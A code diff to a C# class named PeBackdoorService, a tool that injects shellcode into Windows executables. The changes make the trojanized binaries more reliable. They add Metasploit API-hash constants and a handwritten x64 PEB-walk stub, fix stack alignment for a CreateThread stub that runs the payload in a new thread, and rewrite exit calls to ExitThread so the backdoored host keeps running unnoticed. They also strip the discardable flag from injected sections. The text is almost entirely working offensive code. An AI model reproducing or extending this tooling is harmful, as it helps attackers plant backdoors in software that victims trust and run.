@@ -18,13 +18,27 @@ public sealed class PeBackdoorService
     private const ushort IMAGE_FILE_MACHINE_I386 = 0x014c;
     private const ushort IMAGE_FILE_DLL = 0x2000;
 
-    private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
-    private const uint IMAGE_SCN_MEM_READ    = 0x40000000;
-    private const uint IMAGE_SCN_MEM_WRITE   = 0x80000000;
-    private const uint IMAGE_SCN_CNT_CODE    = 0x00000020;
+    private const uint IMAGE_SCN_MEM_EXECUTE     = 0x20000000;
+    private const uint IMAGE_SCN_MEM_READ        = 0x40000000;
+    private const uint IMAGE_SCN_MEM_WRITE       = 0x80000000;
+    private const uint IMAGE_SCN_CNT_CODE        = 0x00000020;
+    private const uint IMAGE_SCN_MEM_DISCARDABLE = 0x02000000;
 
     private const ushort IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040;
     private const ushort IMAGE_SUBSYSTEM_WINDOWS_GUI = 2;
+
+    // ── Metasploit ROR13 API hash constants (block_api.asm) ──────────────
+    // Precomputed using the Metasploit ROR13 algorithm with MaximumLength
+    // (UTF-16LE module name + 2 null bytes). Used to detect and patch
+    // shellcode that calls process-killing exit functions.
+    private const uint MSF_HASH_EXIT_PROCESS                  = 0x56A2B5F0;
+    private const uint MSF_HASH_EXIT_THREAD                   = 0x0A2A1DE0;
+    private const uint MSF_HASH_RTL_EXIT_USER_THREAD          = 0x6F721347;
+    private const uint MSF_HASH_SET_UNHANDLED_EXCEPTION_FILTER = 0xEA320EFE;
+    private const uint MSF_HASH_TERMINATE_PROCESS             = 0x5ECADC87;
+    private const uint MSF_HASH_NT_TERMINATE_PROCESS          = 0x1E35E09C;
+    private const uint MSF_HASH_RTL_EXIT_USER_PROCESS         = 0xAA1B814D;
+    private const uint MSF_HASH_GET_VERSION                   = 0x9DBD95A6;
 
     // ── x64 register save/restore stubs ──────────────────────────────────
     // 16 pushes (15 GPRs + pushfq) = 128 bytes = 0 mod 16.
@@ -46,6 +60,20 @@ public sealed class PeBackdoorService
         0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,     // pop r15-r12
         0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,     // pop r11-r8
         0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58            // pop rdi-rax
+    };
+
+    // Locate kernel32 by walking the first few loaded modules from the PEB.
+    // This is used by compatibility wrappers for shellcode that assumes RBX
+    // already points at kernel32 before it starts parsing exports.
+    private static readonly byte[] X64Kernel32PebWalk = {
+        0x48, 0x31, 0xC9,                                     // xor rcx, rcx
+        0x65, 0x48, 0x8B, 0x41, 0x60,                         // mov rax, gs:[rcx+0x60] (PEB)
+        0x48, 0x8B, 0x40, 0x18,                               // mov rax, [rax+0x18]    (Ldr)
+        0x48, 0x8B, 0x70, 0x20,                               // mov rsi, [rax+0x20]    (InMemOrderModuleList)
+        0x48, 0xAD,                                           // lodsq                  (skip exe)
+        0x48, 0x96,                                           // xchg rax, rsi
+        0x48, 0xAD,                                           // lodsq                  (skip ntdll)
+        0x48, 0x8B, 0x58, 0x20                                // mov rbx, [rax+0x20]    (kernel32 DllBase)
     };
 
     // x86 save/restore
@@ -220,6 +248,15 @@ public sealed class PeBackdoorService
                 peData = StripSignatureOverlay(peData, pe);
                 pe = ParsePe(peData);
                 result.Steps.Add($"Stripped signature overlay (file now {peData.Length:N0} bytes)");
+            }
+
+            // ── Patch exit functions for thread safety ────────────────
+            if (options.PatchExitCalls)
+            {
+                int patchCount;
+                (shellcode, patchCount) = PatchShellcodeExitCalls(shellcode, pe.Is64Bit);
+                if (patchCount > 0)
+                    result.Steps.Add($"Patched {patchCount} destructive exit call(s) → ExitThread for thread safety");
             }
 
             // ── Encrypt shellcode if requested ───────────────────────
@@ -610,13 +647,13 @@ public sealed class PeBackdoorService
     }
 
     /// <summary>
-    /// Build a threaded injection payload that runs shellcode in a new thread via CreateThread.
-    /// This allows the original program to continue running even if the shellcode never returns
-    /// or calls ExitProcess (which is patched to ExitThread).
+     /// Build a threaded injection payload that runs shellcode in a new thread via CreateThread.
+     /// This allows the original program to continue running even if the shellcode never returns
+     /// or calls ExitProcess (which is patched to ExitThread).
     /// Layout: [save regs] [PEB walk + CreateThread(shellcode)] [restore regs] [JMP oep] [shellcode]
-    /// The JMP offset is set to 0 and must be patched after placement.
-    /// x64 only — falls back to inline payload for x86.
-    /// </summary>
+     /// The JMP offset is set to 0 and must be patched after placement.
+     /// x64 only — falls back to inline payload for x86.
+     /// </summary>
     private byte[] BuildThreadedPayload(byte[] shellcode, bool is64Bit, out int jmpOffsetInPayload)
     {
         if (!is64Bit)
@@ -628,23 +665,13 @@ public sealed class PeBackdoorService
             return inline;
         }
 
-        // Patch ExitProcess → ExitThread so the thread exits cleanly instead of killing the process
-        shellcode = PatchExitProcessToExitThread(shellcode);
-
         var buf = new List<byte>();
 
         // ═══ [Save registers] ═══════════════════════════════════════════
         buf.AddRange(X64SaveRegs); // 28 bytes
 
         // ═══ [PEB walk: find kernel32 base] ═════════════════════════════ (26 bytes)
-        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });                         // xor rcx, rcx
-        buf.AddRange(new byte[] { 0x65, 0x48, 0x8B, 0x41, 0x60 });             // mov rax, gs:[rcx+0x60] (PEB)
-        buf.AddRange(new byte[] { 0x48, 0x8B, 0x40, 0x18 });                   // mov rax, [rax+0x18]    (Ldr)
-        buf.AddRange(new byte[] { 0x48, 0x8B, 0x70, 0x20 });                   // mov rsi, [rax+0x20]    (InMemOrderModuleList)
-        buf.AddRange(new byte[] { 0x48, 0xAD });                               // lodsq                  (skip exe)
-        buf.AddRange(new byte[] { 0x48, 0x96 });                               // xchg rax, rsi
-        buf.AddRange(new byte[] { 0x48, 0xAD });                               // lodsq                  (skip ntdll)
-        buf.AddRange(new byte[] { 0x48, 0x8B, 0x58, 0x20 });                   // mov rbx, [rax+0x20]    (kernel32 DllBase)
+        buf.AddRange(X64Kernel32PebWalk);
 
         // ═══ [Export directory parse] ═══════════════════════════════════ (16 bytes)
         buf.AddRange(new byte[] { 0x8B, 0x43, 0x3C });                         // mov eax, [rbx+0x3C]    (e_lfanew)
@@ -668,6 +695,12 @@ public sealed class PeBackdoorService
         buf.AddRange(new byte[] { 0x81, 0x7E, 0x04, 0x74, 0x65, 0x54, 0x68 }); // cmp dword [rsi+4], "teTh"
         int jneNext2 = buf.Count;
         buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
+        buf.AddRange(new byte[] { 0x81, 0x7E, 0x08, 0x72, 0x65, 0x61, 0x64 }); // cmp dword [rsi+8], "read"
+        int jneNext3 = buf.Count;
+        buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
+        buf.AddRange(new byte[] { 0x80, 0x7E, 0x0C, 0x00 });                   // cmp byte [rsi+12], 0
+        int jneNext4 = buf.Count;
+        buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
         int jmpFound = buf.Count;
         buf.AddRange(new byte[] { 0xEB, 0x00 });                               // jmp found (patch later)
 
@@ -690,17 +723,21 @@ public sealed class PeBackdoorService
         buf.AddRange(new byte[] { 0x8B, 0x04, 0x82 });                         // mov eax, [rdx+rax*4]   (function RVA)
         buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx           (CreateThread VA!)
 
-        // CreateThread(NULL, 0, shellcode_addr, NULL, 0, NULL)
-        buf.AddRange(new byte[] { 0x4D, 0x31, 0xC9 });                         // xor r9, r9             (lpParameter = NULL)
-        buf.AddRange(new byte[] { 0x41, 0x51 });                               // push r9                (lpThreadId = NULL)
-        buf.AddRange(new byte[] { 0x41, 0x51 });                               // push r9                (dwCreationFlags = 0)
+        // ═══ [CreateThread with proper x64 ABI stack alignment] ═════════
+        // RBP is already saved in SaveRegs; use it to save/restore RSP.
+        // AND RSP, -16 guarantees alignment regardless of entry RSP value.
+        buf.AddRange(new byte[] { 0x4D, 0x31, 0xC9 });                         // xor r9, r9             (will be lpParameter = NULL; also used as zero)
+        buf.AddRange(new byte[] { 0x48, 0x89, 0xE5 });                         // mov rbp, rsp           (save RSP before alignment)
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xE4, 0xF0 });                   // and rsp, -16           (force 16-byte alignment)
+        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x30 });                   // sub rsp, 0x30          (0x20 shadow + 0x10 for params 5&6)
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x4C, 0x24, 0x28 });             // mov [rsp+0x28], r9     (lpThreadId = NULL)
+        buf.AddRange(new byte[] { 0x4C, 0x89, 0x4C, 0x24, 0x20 });             // mov [rsp+0x20], r9     (dwCreationFlags = 0)
         int leaR8Pos = buf.Count;
-        buf.AddRange(new byte[] { 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00 }); // lea r8, [rip+??]      (lpStartAddress, patch later)
+        buf.AddRange(new byte[] { 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00 }); // lea r8, [rip+??]      (lpStartAddress = shellcode, patch later)
         buf.AddRange(new byte[] { 0x48, 0x31, 0xD2 });                         // xor rdx, rdx           (dwStackSize = 0)
         buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });                         // xor rcx, rcx           (lpThreadAttributes = NULL)
-        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });                   // sub rsp, 0x20          (shadow space)
         buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax               (CreateThread!)
-        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x30 });                   // add rsp, 0x30          (shadow + 2 pushes)
+        buf.AddRange(new byte[] { 0x48, 0x89, 0xEC });                         // mov rsp, rbp           (restore original RSP)
 
         // skip_thread: (fall through to restore + JMP OEP)
         int skipThreadPos = buf.Count;
@@ -724,6 +761,10 @@ public sealed class PeBackdoorService
         bytes[jneNext1 + 1] = (byte)(nextNamePos - (jneNext1 + 2));
         // jne next_name (2nd cmp failed)
         bytes[jneNext2 + 1] = (byte)(nextNamePos - (jneNext2 + 2));
+        // jne next_name (3rd cmp failed)
+        bytes[jneNext3 + 1] = (byte)(nextNamePos - (jneNext3 + 2));
+        // jne next_name (name longer than CreateThread)
+        bytes[jneNext4 + 1] = (byte)(nextNamePos - (jneNext4 + 2));
         // jmp found (both cmps passed)
         bytes[jmpFound + 1] = (byte)(foundPos - (jmpFound + 2));
         // jl search_loop (backward jump)
@@ -739,32 +780,124 @@ public sealed class PeBackdoorService
     }
 
     /// <summary>
-    /// Patches "ExitProcess\0" to "ExitThread\0\0" in shellcode bytes.
-    /// This ensures the shellcode thread exits cleanly without killing the host process.
-    /// Both strings are 12 bytes so the replacement is size-neutral.
+    /// Scan shellcode for destructive exit function patterns and patch them to ExitThread.
+    /// Handles Metasploit-style ROR13 hash-based API resolution (block_api.asm) and
+    /// string-based API resolution (GetProcAddress with function name).
+    ///
+    /// Three patching strategies:
+    ///   1. Exitfunk block: detect GetVersion hash anchor → patch preceding exit hash in mov ebx
+    ///   2. Direct API calls: detect mov r10d/edx with destructive hash + call rbp/edi
+    ///   3. String-based: replace "ExitProcess\0" → "ExitThread\0\0" (12-byte size-neutral)
     /// </summary>
-    private static byte[] PatchExitProcessToExitThread(byte[] shellcode)
+    private (byte[] patched, int patchCount) PatchShellcodeExitCalls(byte[] shellcode, bool is64Bit)
     {
-        byte[] exitProcess = Encoding.ASCII.GetBytes("ExitProcess\0");
-        byte[] exitThread  = Encoding.ASCII.GetBytes("ExitThread\0\0"); // pad to 12 bytes
-
         var patched = (byte[])shellcode.Clone();
+        int patchCount = 0;
 
-        for (int i = 0; i <= patched.Length - exitProcess.Length; i++)
+        if (is64Bit)
         {
-            bool match = true;
-            for (int j = 0; j < exitProcess.Length; j++)
+            // ── Strategy 1: Exitfunk block detection (x64) ─────────────
+            // Metasploit exitfunk pattern:
+            //   BB <exit_hash>         ; mov ebx, EXITFUNK_HASH
+            //   41 BA A6 95 BD 9D      ; mov r10d, 0x9DBD95A6 (GetVersion)
+            //   FF D5                  ; call rbp
+            // Anchor on the GetVersion hash, look back 5 bytes for mov ebx
+            byte[] getVersionSig = { 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D };
+            for (int i = 5; i <= patched.Length - getVersionSig.Length; i++)
             {
-                if (patched[i + j] != exitProcess[j]) { match = false; break; }
+                if (!BytesMatch(patched, i, getVersionSig)) continue;
+                if (patched[i - 5] != 0xBB) continue; // no mov ebx preceding
+
+                uint exitHash = BitConverter.ToUInt32(patched, i - 4);
+                if (IsDestructiveExitHash(exitHash))
+                {
+                    string name = NameForHash(exitHash);
+                    _logger.Info($"Patching exitfunk: {name} (0x{exitHash:X8}) → ExitThread at offset 0x{(i - 4):X}");
+                    BitConverter.GetBytes(MSF_HASH_EXIT_THREAD).CopyTo(patched, i - 4);
+                    patchCount++;
+                }
             }
-            if (match)
+
+            // ── Strategy 2: Direct API hash calls (x64) ───────────────
+            // Pattern: 41 BA <hash_LE_4> FF D5  (mov r10d, <hash>; call rbp)
+            for (int i = 0; i <= patched.Length - 8; i++)
             {
-                Array.Copy(exitThread, 0, patched, i, exitThread.Length);
-                // Patch all occurrences (some shellcodes reference it multiple times)
+                if (patched[i] != 0x41 || patched[i + 1] != 0xBA) continue;
+                if (patched[i + 6] != 0xFF || patched[i + 7] != 0xD5) continue;
+
+                uint hash = BitConverter.ToUInt32(patched, i + 2);
+                if (IsDestructiveExitHash(hash))
+                {
+                    string name = NameForHash(hash);
+                    _logger.Info($"Patching direct call: {name} (0x{hash:X8}) → ExitThread at offset 0x{(i + 2):X}");
+                    BitConverter.GetBytes(MSF_HASH_EXIT_THREAD).CopyTo(patched, i + 2);
+                    patchCount++;
+                }
+            }
+        }
+        else
+        {
+            // ── x86: hash-based calls via push hash; call esi/edi ──────
+            // Pattern: 68 <hash_LE_4> FF D6/FF D7  (push <hash>; call esi/edi)
+            for (int i = 0; i <= patched.Length - 7; i++)
+            {
+                if (patched[i] != 0x68) continue;
+                if (patched[i + 5] != 0xFF) continue;
+                if (patched[i + 6] != 0xD6 && patched[i + 6] != 0xD7) continue;
+
+                uint hash = BitConverter.ToUInt32(patched, i + 1);
+                if (IsDestructiveExitHash(hash))
+                {
+                    string name = NameForHash(hash);
+                    _logger.Info($"Patching x86 call: {name} (0x{hash:X8}) → ExitThread at offset 0x{(i + 1):X}");
+                    BitConverter.GetBytes(MSF_HASH_EXIT_THREAD).CopyTo(patched, i + 1);
+                    patchCount++;
+                }
             }
         }
 
-        return patched;
+        // ── Strategy 3: String-based patching (arch-independent) ───────
+        byte[] exitProcessStr = Encoding.ASCII.GetBytes("ExitProcess\0");
+        byte[] exitThreadStr  = Encoding.ASCII.GetBytes("ExitThread\0\0");
+        for (int i = 0; i <= patched.Length - exitProcessStr.Length; i++)
+        {
+            if (!BytesMatch(patched, i, exitProcessStr)) continue;
+            Array.Copy(exitThreadStr, 0, patched, i, exitThreadStr.Length);
+            _logger.Info($"Patching string: \"ExitProcess\" → \"ExitThread\" at offset 0x{i:X}");
+            patchCount++;
+        }
+
+        if (patchCount > 0)
+            _logger.Ok($"Applied {patchCount} exit function patch(es) for thread safety");
+
+        return (patched, patchCount);
+    }
+
+    private static bool IsDestructiveExitHash(uint hash) =>
+        hash == MSF_HASH_EXIT_PROCESS
+        || hash == MSF_HASH_SET_UNHANDLED_EXCEPTION_FILTER
+        || hash == MSF_HASH_TERMINATE_PROCESS
+        || hash == MSF_HASH_NT_TERMINATE_PROCESS
+        || hash == MSF_HASH_RTL_EXIT_USER_PROCESS;
+
+    private static string NameForHash(uint hash) => hash switch
+    {
+        MSF_HASH_EXIT_PROCESS => "ExitProcess",
+        MSF_HASH_SET_UNHANDLED_EXCEPTION_FILTER => "SetUnhandledExceptionFilter",
+        MSF_HASH_TERMINATE_PROCESS => "TerminateProcess",
+        MSF_HASH_NT_TERMINATE_PROCESS => "NtTerminateProcess",
+        MSF_HASH_RTL_EXIT_USER_PROCESS => "RtlExitUserProcess",
+        _ => $"Unknown(0x{hash:X8})"
+    };
+
+    private static bool BytesMatch(byte[] data, int offset, byte[] pattern)
+    {
+        if (offset + pattern.Length > data.Length) return false;
+        for (int j = 0; j < pattern.Length; j++)
+        {
+            if (data[offset + j] != pattern[j]) return false;
+        }
+        return true;
     }
 
     /// <summary>
@@ -931,7 +1064,8 @@ public sealed class PeBackdoorService
         uint requiredFlags = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
         if ((section.Characteristics & requiredFlags) != requiredFlags)
         {
-            uint newChars = section.Characteristics | requiredFlags | IMAGE_SCN_CNT_CODE;
+            // Clear DISCARDABLE — loader may unmap discardable sections after init, crashing our code
+            uint newChars = (section.Characteristics & ~IMAGE_SCN_MEM_DISCARDABLE) | requiredFlags | IMAGE_SCN_CNT_CODE;
             output = PatchSectionCharacteristics(output, section, newChars);
             result.Steps.Add($"Made {section.Name} section executable (0x{section.Characteristics:X8} → 0x{newChars:X8})");
         }
@@ -1036,8 +1170,8 @@ public sealed class PeBackdoorService
         BitConverter.GetBytes(newVirtSize).CopyTo(output, lastSection.HeaderFileOffset + 8);
         BitConverter.GetBytes(newRawSize).CopyTo(output, lastSection.HeaderFileOffset + 16);
 
-        // Make section executable if not already
-        uint chars = lastSection.Characteristics | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
+        // Make section executable; clear DISCARDABLE so the loader doesn't unmap it
+        uint chars = (lastSection.Characteristics & ~IMAGE_SCN_MEM_DISCARDABLE) | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
         BitConverter.GetBytes(chars).CopyTo(output, lastSection.HeaderFileOffset + 36);
 
         // Update SizeOfImage
